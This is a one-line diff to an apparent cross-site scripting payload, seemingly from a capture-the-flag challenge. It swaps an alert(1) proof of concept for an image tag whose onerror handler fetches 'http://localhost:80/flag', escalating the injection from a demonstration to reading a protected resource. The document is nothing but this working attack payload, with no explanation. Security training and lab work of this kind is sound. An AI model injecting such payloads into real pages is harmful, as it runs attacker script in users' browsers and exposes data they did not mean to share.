@@ -1,1 +1,1 @@
-<img src="x" onerror="alert(1)">
+<img src="x" onerror="fetch('http://localhost:80/flag')">
